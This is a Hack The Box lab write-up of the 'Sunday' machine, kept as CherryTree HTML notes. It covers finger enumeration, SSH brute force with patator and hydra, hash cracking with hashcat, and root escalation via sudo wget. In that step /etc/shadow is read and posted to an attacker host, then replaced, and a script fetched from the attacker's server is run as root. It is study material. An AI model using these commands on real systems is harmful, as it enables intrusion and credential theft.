<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>sunday</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#sunday">sunday</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<ol>
<li><a href="#all ports">all ports</a></li>
<li><a href="#targetted ports">targetted ports</a></li>
</ol>
<li><a href="#finger user enumeration">finger user enumeration</a></li>
<ol>
<li><a href="#usage">usage</a></li>
<li><a href="#scan report">scan report</a></li>
<ol>
<li><a href="#scan report on root">scan report on root</a></li>
</ol>
</ol>
<li><a href="#ssh password brute force w/ patador &amp; Hydra">ssh password brute force w/ patador &amp; Hydra</a></li>
<ol>
<li><a href="#finding good password list">finding good password list</a></li>
<li><a href="#sunny ssh_login bruteforce">sunny ssh_login bruteforce</a></li>
</ol>
<li><a href="#ssh sunny">ssh sunny</a></li>
<ol>
<li><a href="#sudo -l">sudo -l</a></li>
<li><a href="#ls /">ls /</a></li>
<li><a href="#hashcat">hashcat</a></li>
<ol>
<li><a href="#bruteforce">bruteforce</a></li>
</ol>
</ol>
<li><a href="#sammy">sammy</a></li>
<ol>
<li><a href="#sudo -l /usr/bin/wget">sudo -l /usr/bin/wget</a></li>
<ol>
<li><a href="#sudo wget -i /etc/shadow">sudo wget -i /etc/shadow</a></li>
<li><a href="#troll script">troll script</a></li>
</ol>
<li><a href="#privesc with /root/troll">privesc with /root/troll</a></li>
<ol>
<li><a href="#proof of overwrite /root/troll script on root">proof of overwrite /root/troll script on root</a></li>
</ol>
</ol>
<li><a href="#potential shellshock (fail)">potential shellshock (fail)</a></li>
<ol>
<li><a href="#assigning env variable to shellshock &amp; testing">assigning env variable to shellshock &amp; testing</a></li>
</ol>
<li><a href="#privesc through wget etc/shadow ">privesc through wget etc/shadow </a></li>
<ol>
<li><a href="#wget upload.php ">wget upload.php </a></li>
<li><a href="#upload.php">upload.php</a></li>
<li><a href="#useradd st0ve">useradd st0ve</a></li>
<ol>
<li><a href="#php server">php server</a></li>
<li><a href="#edit shadow">edit shadow</a></li>
<li><a href="#wget shadow">wget shadow</a></li>
<li><a href="#log into root">log into root</a></li>
</ol>
</ol>
<li><a href="#privesc with /usr/bin/pfsh">privesc with /usr/bin/pfsh</a></li>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page", id="sunday"><h1><b><u>sunday</u></b></h1><img alt="images/548-1.png" src="images/548-1.png"/><br/><img alt="images/548-2.png" src="images/548-2.png"/></div>

<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><img alt="images/549-1.png" src="images/549-1.png"/><br/><span style="color:#24ff00;">Basic nmap scan shows <br/>port </span><span style="color:#ffa500;">79</span><span style="color:#24ff00;"> finger service is running version </span><span style="color:#ffa500;">Sun Solaris fingerd</span><span style="color:#24ff00;"><br/>port </span><span style="color:#ffa500;">111</span><span style="color:#24ff00;"> rpcbind 2-4</span><br/></div>
<div class="page" id="all ports"><h1><b><u>all ports</u></b></h1><img alt="images/553-1.png" src="images/553-1.png"/></div>
<div class="page" id="targetted ports"><h1><b><u>targetted ports</u></b></h1><span style="color:#24ff00;">lets target ports </span><span style="color:#ffa500;">79, 111, 22022, 33158 and 58398</span><br/><br/><img alt="images/554-1.png" src="images/554-1.png"/><br/><span style="color:#24ff00;">the targeted scan discovered there is an </span><span style="color:#ffff00;">ssh terminal </span><span style="color:#24ff00;">running on port </span><span style="color:#ffa500;">22022</span><span style="color:#24ff00;">! </span><br/></div>
<div class="page" id="finger user enumeration"><h1><b><u>finger user enumeration</u></b></h1><span style="color:#24ff00;">Theres a great enumeration tool for </span><img alt="images/550-1.png" src="images/550-1.png"/> <span style="color:#ffff00;">pentestmonkey</span><span style="color:#24ff00;"> published called </span><span style="color:#ffa500;">finger-user-enum</span><span style="color:#24ff00;"> thats a great place for us to start </span><br/><img alt="images/550-2.png" src="images/550-2.png"/><br/><img alt="images/550-3.png" src="images/550-3.png"/><br/><br/><span style="color:#24ff00;">feel free to download it straight off </span><span style="color:#ffff00;">github</span><span style="color:#24ff00;"> or </span><br/><img alt="images/550-4.png" src="images/550-4.png"/><br/><br/><br/><span style="color:#24ff00;">or use </span><span style="color:#ffa500;">git clone https://github.com/pentestmonkey/finger-user-enum.git</span> <span style="color:#24ff00;">to clone it </span><br/><img alt="images/550-5.png" src="images/550-5.png"/><br/></div>
<div class="page" id="usage"><h1><b><u>usage</u></b></h1><span style="color:#ffa500;">finger-user-enum.pl</span> <span style="color:#24ff00;">usage</span> <br/><img alt="images/555-1.png" src="images/555-1.png"/></div>
<div class="page" id="scan report"><h1><b><u>scan report</u></b></h1><span style="color:#24ff00;">PIpe </span><span style="color:#ffa500;">finger-user-enum</span><span style="color:#24ff00;"> to</span><span style="color:#ffa500;"> less -S </span><span style="color:#24ff00;">to kill off line wrapping and make the report easier to read<br/><br/>run off </span><span style="color:#ffa500;">names.txt </span><span style="color:#24ff00;">wordlist from the </span><span style="color:#ffa500;">SecList</span><span style="color:#24ff00;"> github repo</span><br/><img alt="images/556-1.png" src="images/556-1.png"/><br/><br/><span style="color:#24ff00;">We see users </span><span style="color:#ffff00;">sammy</span><span style="color:#24ff00;"> and </span><span style="color:#ffff00;">sunny</span><span style="color:#24ff00;"> are unlike the other users, safe to assume they are human users and not services</span><br/><img alt="images/556-2.png" src="images/556-2.png"/><br/><br/><br/>-&gt;<img alt="images/556-3.png" src="images/556-3.png"/></div>
<div class="page" id="scan report on root"><h1><b><u>scan report on root</u></b></h1><span style="color:#24ff00;">we can also assume that </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;"> is a user on the sunday box so lets enumerate that user as well with </span><span style="color:#ffa500;">finger-user-enum.pl</span><br/><br/><span style="color:#ffa500;">./finger-user-enum.pl -u root -t 10.10.10.76</span><br/><img alt="images/557-1.png" src="images/557-1.png"/></div>
<div class="page" id="ssh password brute force w/ patador &amp; Hydra"><h1><b><u>ssh password brute force w/ patador &amp; Hydra</u></b></h1><span style="color:#24ff00;">lets use </span><span style="color:#ffa500;">patator</span><span style="color:#24ff00;"> and try to attempt to brute force an ssh login against a password list<br/></span><span style="color:#ffff00;">note</span><span style="color:#24ff00;">: </span><span style="color:#ffa500;">hydra</span><span style="color:#24ff00;"> has ssh brute force capabilities too if you prefer and I will list the equivilent hydra command in the subsequent notes</span><br/><br/> <img alt="images/559-1.png" src="images/559-1.png"/><br/><img alt="images/559-2.png" src="images/559-2.png"/></div>
<div class="page" id="finding good password list"><h1><b><u>finding good password list</u></b></h1><span style="color:#24ff00;">since the rockyou wordlist contains over a million passwords, lets use some simple find commands on our </span><span style="color:#ffff00;">Seclists</span><span style="color:#24ff00;"> repo (if you don't have it you can grab it </span><a href="https://github.com/danielmiessler/SecLists">here</a><span style="color:#24ff00;">) to find an effective wordlist of a smaller size to expedite our ssh brute force</span><br/><br/><br/><span style="color:#ffa500;">/usr/share/seclists/Passwords/ </span><br/><img alt="images/563-1.png" src="images/563-1.png"/><br/><br/><span style="color:#24ff00;">we want a wordlist that has roughly</span><span style="color:#ffff00;"> 1000-1500 </span><span style="color:#24ff00;">common passwords since rockyou has too many for an </span><span style="color:#ffa500;">ssh_login</span><span style="color:#24ff00;"> brute force</span><br/><br/><span style="color:#24ff00;">lets use </span><span style="color:#ffa500;">find . -type f exec wc -l {} \; | sort -nr</span><br/><img alt="images/563-2.png" src="images/563-2.png"/><br/><img alt="images/563-3.png" src="images/563-3.png"/><br/><br/><span style="color:#24ff00;">Lets use </span><span style="color:#ffa500;">./probable-v2-top1575.txt </span></div>
<div class="page" id="sunny ssh_login bruteforce"><h1><b><u>sunny ssh_login bruteforce</u></b></h1><span style="color:#24ff00;">Here's Patador's usage options as well as an bruteforce example to start:</span><br/><span style="color:#ffa500;">  ssh_login host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'</span><br/><img alt="images/561-1.png" src="images/561-1.png"/><br/><br/><br/><span style="color:#ffa500;">patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed'</span><br/><img alt="images/561-2.png" src="images/561-2.png"/><br/><br/><img alt="images/561-3.png" src="images/561-3.png"/><br/><br/><span style="color:#24ff00;">bingo! password </span><span style="color:#ffff00;">sunday</span><span style="color:#24ff00;"> successfully logs into ssh via username </span><span style="color:#ffff00;">sunny</span><span style="color:#24ff00;"> due to the ssh protocol banner being properly returned</span><br/><img alt="images/561-4.png" src="images/561-4.png"/><br/><br/><span style="color:#24ff00;">Here is the hydra equivilent ssh brute force</span><br/><span style="color:#ffa500;">hydra -l sunny -P /usr/share/wordlists/SecLists/Passwords/probable-v2-top1575.txt 10.10.10.76 ssh -s 22022</span><br/><span style="color:#24ff00;">where</span><span style="color:#ffa500;"> -l </span><span style="color:#24ff00;">is the single user </span><span style="color:#ffff00;">sunny</span><br/><span style="color:#ffa500;">-P</span><span style="color:#24ff00;"> is the</span><span style="color:#ffff00;"> password list</span><br/><span style="color:#ffa500;">ssh</span><span style="color:#24ff00;"> is the bruteforce type<br/>and </span><span style="color:#ffa500;">-s </span><span style="color:#24ff00;">is the port </span><span style="color:#ffa500;">22022</span><span style="color:#24ff00;"> (default is 22)<br/></span><br/><img alt="images/561-5.png" src="images/561-5.png"/><br/><span style="color:#24ff00;">hydra also finds</span><span style="color:#ffff00;"> sunny's </span><span style="color:#24ff00;">password </span><span style="color:#ffff00;">sunday</span><span style="color:#24ff00;"> for us!</span></div>
<div class="page" id="ssh sunny"><h1><b><u>ssh sunny</u></b></h1><span style="color:#24ff00;">Lets first try to connect to user sunny with our bruteforced password through </span><span style="color:#ffff00;">sunday</span><span style="color:#24ff00;">'s ssh port located on </span><span style="color:#ffa500;">22022</span><span style="color:#24ff00;"> </span><br/><img alt="images/558-1.png" src="images/558-1.png"/><br/><span style="color:#24ff00;">we get an </span><span style="color:#ff0000;">error</span><span style="color:#24ff00;"> message regarding an inability to negotiate because theres no matching key exchange method between our attack machine and the Sunday machine</span><br/><br/><br/><span style="color:#24ff00;">thankfully the server gives us a list of key exchanges that will match it</span><br/><span style="color:#ffa500;">gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==<br/>diffie-hellman-group-exchange-sha1<br/>diffie-hellman-group1-sha1</span><br/><br/><span style="color:#24ff00;">we need a matching key exchange method, lets look up how to apply one of these key exchange methods to our ssh connection:</span><br/><br/><span style="color:#24ff00;">use</span> <span style="color:#ffa500;">-okexAlgorithms=+&lt;algorithm&gt;</span><span style="color:#24ff00;"> to specify which key exchange algorithm you want to use<br/>(</span><span style="color:#ffa500;">diffie-helman-group1-sha1 </span><span style="color:#24ff00;">was simply easiest to type out)</span><br/><br/><img alt="images/558-2.png" src="images/558-2.png"/><br/><img alt="images/558-3.png" src="images/558-3.png"/><br/><br/><br/><span style="color:#24ff00;">and we're logged in as sunny!</span><br/><img alt="images/558-4.png" src="images/558-4.png"/></div>
<div class="page" id="sudo -l"><h1><b><u>sudo -l</u></b></h1><span style="color:#24ff00;">Lets issue </span><span style="color:#ffa500;">sudo -l </span><span style="color:#24ff00;">first to see what permissions sunny has:</span><br/><img alt="images/564-1.png" src="images/564-1.png"/><br/><br/><span style="color:#24ff00;">no useful information by running it</span><br/><img alt="images/564-2.png" src="images/564-2.png"/><br/><br/></div>
<div class="page" id="ls /"><h1><b><u>ls /</u></b></h1><img alt="images/565-1.png" src="images/565-1.png"/><br/><br/><span style="color:#24ff00;">the </span><img alt="images/565-2.png" src="images/565-2.png"/> folder is NOT standard in linux home directories, lets take a look at that:<br/><br/><img alt="images/565-3.png" src="images/565-3.png"/><br/><br/><span style="color:#24ff00;">Nice theres a /etc/shadow backup folder containing login passwords for sunny and sammy</span><br/><img alt="images/565-4.png" src="images/565-4.png"/><br/><br/><span style="color:#24ff00;">lets store both these hashes for </span><span style="color:#ffa500;">hashcat</span><span style="color:#24ff00;"> or </span><span style="color:#ffa500;">crackstation</span><span style="color:#24ff00;"> </span><br/><img alt="images/565-5.png" src="images/565-5.png"/><br/><img alt="images/565-6.png" src="images/565-6.png"/></div>
<div class="page" id="hashcat"><h1><b><u>hashcat</u></b></h1><span style="color:#24ff00;">first lets research which type of hash the passwords were encrypted in: </span><span style="color:#ffa500;">$5$</span><br/><br/><img alt="images/566-1.png" src="images/566-1.png"/><br/><br/><span style="color:#24ff00;">we see it is </span><span style="color:#ffa500;">sha256crypt</span><span style="color:#ffff00;"> </span><span style="color:#24ff00;">which is mode </span><span style="color:#ffa500;">7400</span><span style="color:#24ff00;"> in hashcat</span></div>
<div class="page" id="bruteforce"><h1><b><u>bruteforce</u></b></h1><span style="color:#24ff00;">brute forcing hashes is much faster than brute forcing ssh so </span><span style="color:#ffa500;">rockyou.txt </span><span style="color:#24ff00;">works fine here:</span><br/><br/><img alt="images/567-1.png" src="images/567-1.png"/><br/><br/><img alt="images/567-2.png" src="images/567-2.png"/><br/><img alt="images/567-3.png" src="images/567-3.png"/><br/><br/><span style="color:#24ff00;">Perfect! we cracked </span><span style="color:#ffff00;">sammy's</span><span style="color:#24ff00;"> password to be </span><span style="color:#ffff00;">cooldude</span><span style="color:#24ff00;">!</span><br/></div>
<div class="page" id="sammy"><h1><b><u>sammy</u></b></h1><span style="color:#24ff00;">lets switch users to </span><span style="color:#ffff00;">sammy</span><span style="color:#24ff00;"> using their password </span><span style="color:#ffff00;">cooldude</span> <span style="color:#24ff00;">we brute forced:<br/></span><img alt="images/569-1.png" src="images/569-1.png"/><br/><br/><br/><img alt="images/569-2.png" src="images/569-2.png"/><br/>One thing worth noting is that the box is from<span style="color:#ffff00;"> November 2008</span><span style="color:#24ff00;">, and there was a known “</span><span style="color:#ffa500;">shellshock</span><span style="color:#24ff00;">” vulnerability that was released not long after this time, lets check if its vulnerable:</span></div>
<div class="page" id="sudo -l /usr/bin/wget"><h1><b><u>sudo -l /usr/bin/wget</u></b></h1><span style="color:#24ff00;">we can use </span><span style="color:#ffa500;">wget</span><span style="color:#24ff00;"> with sudo privileges interestingly enough:</span><br/><br/><img alt="images/571-1.png" src="images/571-1.png"/><br/><br/><br/><span style="color:#24ff00;">Huge find: </span><span style="color:#ffa500;">wget</span><span style="color:#24ff00;"> allows us to use</span><span style="color:#ffa500;"> -i </span><span style="color:#24ff00;">argument</span> <span style="color:#24ff00;">to </span><span style="color:#ffff00;">download</span><span style="color:#24ff00;"> any files we want (even within the sunday box) as </span><span style="color:#ffff00;">root</span><span style="color:#24ff00;">! </span><br/><img alt="images/571-2.png" src="images/571-2.png"/><br/><br/><br/><img alt="images/571-3.png" src="images/571-3.png"/><br/><br/><br/></div>
<div class="page" id="sudo wget -i /etc/shadow"><h1><b><u>sudo wget -i /etc/shadow</u></b></h1><span style="color:#24ff00;">when wget downloads a file, it lists it, effectively </span><span style="color:#ffff00;">leaking</span><span style="color:#24ff00;"> its contents to us, lets get started by downloading </span><span style="color:#ffff00;">Sunday's </span><span style="color:#24ff00;">/</span><span style="color:#ffa500;">etc/shadow </span><span style="color:#24ff00;">file to try and crack its </span><span style="color:#ffff00;">hash</span><br/><img alt="images/576-1.png" src="images/576-1.png"/><br/><br/><span style="color:#24ff00;">Lets make it easier on the eyes with awk</span><br/><span style="color:#ffa500;">wget -i /etc/shadow 2&gt;&amp;1 | awk ‘{print $4};'</span><br/><img alt="images/576-2.png" src="images/576-2.png"/><br/><span style="color:#24ff00;">we know root's hash for potential brute force:</span><br/><br/><span style="color:#24ff00;">also looking up the hash prefix from hashcat's hash examples, we see that it is a </span><span style="color:#ffff00;">sha256crypt hash</span><span style="color:#24ff00;">, so we'll use module </span><span style="color:#ffa500;">7400</span><span style="color:#24ff00;"> in our brute force</span><br/><img alt="images/576-3.png" src="images/576-3.png"/><br/><span style="color:#ffff00;">$5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD</span> <br/><br/>we'll save sunny, sammy and root's hashes in a text file for our hashcat bruteforce<br/><img alt="images/576-4.png" src="images/576-4.png"/><br/><br/><br/><span style="color:#ffa500;">hashcat -m 7400 hashes /usr/share/wordlist/rockyou.txt</span><br/><img alt="images/576-5.png" src="images/576-5.png"/><br/><span style="color:#ff0000;">unfortunately</span><span style="color:#ffff00;"> root's </span><span style="color:#24ff00;">password hash is </span><span style="color:#ff0000;">not</span><span style="color:#24ff00;"> on the </span><span style="color:#ffff00;">rockyou</span> <span style="color:#24ff00;">list</span><br/></div>
<div class="page" id="troll script"><h1><b><u>troll script</u></b></h1><span style="color:#24ff00;">if we run sudo wget /root/troll we can see that the file is just a bash script running <br/>“testing”</span><br/><br/><img alt="images/578-1.png" src="images/578-1.png"/><br/><br/><span style="color:#24ff00;">we can try to rewrite it to open up a terminal and escalate to root<br/><br/>to do that we have to rewrite the troll bash script on our attacking machine and have sammy download it and overwrite its output where the original file was located:<br/></span><img alt="images/578-2.png" src="images/578-2.png"/><br/><img alt="images/578-3.png" src="images/578-3.png"/><br/><br/>spin up our http server...<br/><img alt="images/578-4.png" src="images/578-4.png"/><br/><br/>and use <span style="color:#ffa500;">wget</span><span style="color:#24ff00;"> to download it to our victim and execute it:<br/></span><img alt="images/578-5.png" src="images/578-5.png"/><br/><br/><img alt="images/578-6.png" src="images/578-6.png"/><br/><br/>now to run it on <span style="color:#ffff00;">sunny</span><span style="color:#24ff00;"> who can sudo this file:<br/></span><img alt="images/578-7.png" src="images/578-7.png"/><br/><br/>we see it <span style="color:#ffa500;">reverts</span><span style="color:#24ff00;"> back to the original script, lets use sleep in order to time running it perfectly:</span><br/><br/><br/><br/></div>
<div class="page" id="privesc with /root/troll"><h1><b><u>privesc with /root/troll</u></b></h1><span style="color:#24ff00;">trick here is to run</span><span style="color:#ffff00;"> </span><span style="color:#ffa500;">/root/troll </span><span style="color:#24ff00;">on sunny within </span><span style="color:#ffff00;">5 seconds</span><span style="color:#24ff00;"> before it gets rewritten</span><br/><br/><span style="color:#24ff00;">we need to use wget to grab the /root/troll script from our attacking box and overwrite it on our victim immediately running it on sunny within the 5 seconds it takes the box to revert the script:</span><br/><br/><span style="color:#24ff00;">we can use sleep and run the script as soon as we see it hit our HTTP server:</span><br/><br/><span style="color:#24ff00;">Lets get the commands ready on each terminal (I like using terminator for a split shell environment but </span><span style="color:#ffa500;">tmux</span><span style="color:#24ff00;"> is a great option as well if you're familiar with it)</span><br/><br/><span style="color:#ffa500;">sleep 5; sudo wget 10.10.14.62:8000/troll  -O /root/troll <br/>sudo /root/troll</span><br/><img alt="images/579-1.png" src="images/579-1.png"/><br/><br/><span style="color:#24ff00;">VOILA! we got root on sunny</span><br/><img alt="images/579-2.png" src="images/579-2.png"/><br/><br/><br/></div>
<div class="page" id="proof of overwrite /root/troll script on root"><h1><b><u>proof of overwrite /root/troll script on root</u></b></h1><span style="color:#24ff00;">This is just </span><span style="color:#ffff00;">proof</span><span style="color:#24ff00;"> that the </span><span style="color:#ffa500;">/root/troll </span><span style="color:#24ff00;">file was getting updated </span><span style="color:#ffff00;">every 5 seconds</span><span style="color:#24ff00;"> and we needed to be timely executing it via sunny:</span><br/><br/><img alt="images/583-1.png" src="images/583-1.png"/></div>
<div class="page" id="potential shellshock (fail)"><h1><b><u>potential shellshock (fail)</u></b></h1><img alt="images/572-1.png" src="images/572-1.png"/><br/><span style="color:#24ff00;">One thing worth noting is that the box is from</span><span style="color:#ffff00;"> November 2008</span><span style="color:#24ff00;">, and there was a known “</span><span style="color:#ffa500;">shellshock</span><span style="color:#24ff00;">” vulnerability that was released not long after this time, lets check if its vulnerable:</span><br/><br/><br/><br/><span style="color:#24ff00;">first hop back onto user </span><span style="color:#ffff00;">sunny</span><br/><img alt="images/572-2.png" src="images/572-2.png"/><br/><br/><span style="color:#24ff00;">create a random variable, and issue the shellshock payload as such and then issue a </span><br/>'<span style="color:#ffa500;">(){ :;};</span> <span style="color:#ffa500;">&lt;random command&gt;' &lt;real cmd&gt;</span><br/><br/><span style="color:#24ff00;">shellshock is</span><span style="color:#ffa500;"> (){ :;};</span><br/><img alt="images/572-3.png" src="images/572-3.png"/><br/><br/><br/><span style="color:#24ff00;">appears to be vulnerable! this is what calling echo would look like without the shellshock payload:</span><br/><img alt="images/572-4.png" src="images/572-4.png"/><br/><br/><span style="color:#24ff00;">as we can see echo doesnt execute</span><br/><br/></div>
<div class="page" id="assigning env variable to shellshock &amp; testing"><h1><b><u>assigning env variable to shellshock &amp; testing</u></b></h1><span style="color:#24ff00;">doesnt say any environment tools are being kept but we're going to pick one anyway:</span><br/><br/><img alt="images/573-1.png" src="images/573-1.png"/><br/><br/><span style="color:#24ff00;">do one we think we can use that has not changed:</span><br/><span style="color:#ffff00;">LOGNAME</span><br/><br/><br/><span style="color:#24ff00;">The box will be shellshock vulnerable if we see </span><span style="color:#ffa500;">echo shellshock</span><span style="color:#24ff00;"> output when we call sudo /root/troll</span>\<br/><img alt="images/573-2.png" src="images/573-2.png"/><br/><span style="color:#ff0000;">Booo</span><span style="color:#24ff00;">! the box is </span><span style="color:#ff0000;">not</span><span style="color:#24ff00;"> vulnerable to shellshock through sudo</span><br/></div>
<div class="page" id="privesc through wget etc/shadow "><h1><b><u>privesc through wget etc/shadow </u></b></h1><span style="color:#24ff00;">lets use wget to put our victim's /etc/shadow file onto our attacking machine and then upload it back so we can ssh with a known password back to root<br/><br/>search wget -h to find a way how to PUT files<br/></span><img alt="images/581-1.png" src="images/581-1.png"/><br/><img alt="images/581-2.png" src="images/581-2.png"/><br/><br/>unfortunately no options for changing method to a PUT request.... but if we write a script that handles Post files  on our attacking machine <br/><br/>lets set up a listener on our machine first and write a --post-file to it from our victim sammy<br/><img alt="images/581-3.png" src="images/581-3.png"/><br/><br/><img alt="images/581-4.png" src="images/581-4.png"/><br/><br/><img alt="images/581-5.png" src="images/581-5.png"/></div>
<div class="page" id="wget upload.php "><h1><b><u>wget upload.php </u></b></h1><span style="color:#24ff00;">now instead of just connecting to our attack machine, lets go to a script we create that we'll call upload.php and an argument of the filename<br/><br/></span><img alt="images/585-1.png" src="images/585-1.png"/><br/><br/>now were handling POST request with a argument and a file attached... we can work with this<br/><img alt="images/585-2.png" src="images/585-2.png"/></div>
<div class="page" id="upload.php"><h1><b><u>upload.php</u></b></h1><img alt="images/587-1.png" src="images/587-1.png"/><br/><img alt="images/587-2.png" src="images/587-2.png"/><br/><span style="color:#24ff00;">there are several vulnerabilities with this script that allow a user to escape our ‘upload/’ directory, upload a script and execute it...<br/><br/>we can fix that by playing with umask settings filtering the user from inputting a “../” and escaping our directory</span><br/><img alt="images/587-3.png" src="images/587-3.png"/><br/><br/></div>
<div class="page" id="useradd st0ve"><h1><b><u>useradd st0ve</u></b></h1><span style="color:#24ff00;">we don't want to write exploitable code owned by root on our attacking machine so we're going to add a user with limited permissions</span><br/><br/><img alt="images/586-1.png" src="images/586-1.png"/><br/><br/><span style="color:#24ff00;">set st0ve user to own upload folder</span> <span style="color:#24ff00;">with</span><span style="color:#ffa500;"> chown st0ve upload/</span><br/><img alt="images/586-2.png" src="images/586-2.png"/><br/><br/><span style="color:#ffa500;">cdmod 222 </span><span style="color:#24ff00;">for test so no user (besides root) can write to it:</span><br/><img alt="images/586-3.png" src="images/586-3.png"/><img alt="images/586-4.png" src="images/586-4.png"/></div>
<div class="page" id="php server"><h1><b><u>php server</u></b></h1><span style="color:#24ff00;">this server can upload and execute php files, it is not commonly used over </span><span style="color:#ffa500;">python -m simpleHTTPServer</span><span style="color:#24ff00;">  but still works great<br/></span><img alt="images/588-1.png" src="images/588-1.png"/> is the command<br/><br/><img alt="images/588-2.png" src="images/588-2.png"/><br/><br/>Now we can upload <span style="color:#ffa500;">/etc/shadow</span><span style="color:#24ff00;"> to our IP and creates the file shadow<br/></span><img alt="images/588-3.png" src="images/588-3.png"/><br/><br/>this uploads shadow to our <span style="color:#ffa500;">/upload</span><span style="color:#24ff00;"> directory </span><img alt="images/588-4.png" src="images/588-4.png"/><br/><img alt="images/588-5.png" src="images/588-5.png"/><br/><br/></div>
<div class="page" id="edit shadow"><h1><b><u>edit shadow</u></b></h1><span style="color:#24ff00;">before: </span><br/><img alt="images/590-1.png" src="images/590-1.png"/><br/><br/><span style="color:#24ff00;">after overwriting </span><span style="color:#ffff00;">root's</span><span style="color:#24ff00;"> hash with </span><span style="color:#ffff00;">sammy's </span> <br/> <img alt="images/590-2.png" src="images/590-2.png"/><br/><br/><br/><span style="color:#24ff00;">finally change the </span><span style="color:#ffa500;">shadow</span><span style="color:#24ff00;"> file permissions so </span><span style="color:#ffff00;">st0ve</span> (or the user you created)<span style="color:#24ff00;"> can write to it:</span><br/><img alt="images/590-3.png" src="images/590-3.png"/><br/></div>
<div class="page" id="wget shadow"><h1><b><u>wget shadow</u></b></h1><span style="color:#24ff00;">lastly we upload our new shadow file to our victim's </span><span style="color:#ffa500;">/etc/shadow </span><span style="color:#24ff00;">folder </span><br/><br/><span style="color:#24ff00;">first copy our shadow file down a folder to /php/</span> (or make a new directory within your Sunday directory)<br/><img alt="images/591-1.png" src="images/591-1.png"/><br/><br/><img alt="images/591-2.png" src="images/591-2.png"/><br/><br/><br/><span style="color:#24ff00;">Success!</span><br/><img alt="images/591-3.png" src="images/591-3.png"/></div>
<div class="page" id="log into root"><h1><b><u>log into root</u></b></h1><span style="color:#24ff00;">now we can switch user to root using </span><span style="color:#ffff00;">sammy's </span><span style="color:#24ff00;">password which was </span><span style="color:#ffff00;">cooldude!<br/></span><span style="color:#24ff00;"><br/>and we're in!</span><br/><img alt="images/592-1.png" src="images/592-1.png"/><br/><br/><br/></div>
<div class="page" id="privesc with /usr/bin/pfsh"><h1><b><u>privesc with /usr/bin/pfsh</u></b></h1><span style="color:#24ff00;">I don't know if this was intended but running </span><span style="color:#ffa500;">pfsh</span><span style="color:#24ff00;"> is a shell that runs with root privileges </span><br/><br/><img alt="images/589-1.png" src="images/589-1.png"/><br/><br/><br/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/582-1.png" src="images/582-1.png"/><br/><span style="color:#ffff00;">a3d9498027ca5187ba1793943ee8a598</span><br/><br/><img alt="images/582-2.png" src="images/582-2.png"/><br/><span style="color:#ffff00;">fb40fab61d99d37536daeec0d97af9b8</span></div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1965-1.png" src="images/1965-1.png"/><br/><br/><br/><span style="color:#191905;">1. </span><span style="color:#24ff00;">Fun box where you enumerate users on finger service the box runs, find it has an ssh port on an uncommon port<br/></span><span style="color:#191905;">2.</span><span style="color:#24ff00;"> from there you get sunny user by either guessing their password or using an ssh brute force prorgram like protator<br/></span><span style="color:#191905;">3. </span><span style="color:#24ff00;">you hop on sunny and see it can run a file called /root/troll as root without a sudo password and that there is a backup log with an old /etc/shadow list<br/></span><span style="color:#191905;">4. </span><span style="color:#24ff00;">you can brute force user sammy's hash from the old /etc/shadow list using hashcat<br/></span><span style="color:#191905;">5. </span><span style="color:#24ff00;">from there you notice sammy can run wget as root without a password so there are two main ways I showed how to priv esc utilizing sunny/sammy to rewrite /troll/root OR you can reupload /etc/shadow to the box with sammy from your attacking machine and log into root with a known password<br/></span><br/></div>
</div></body></html>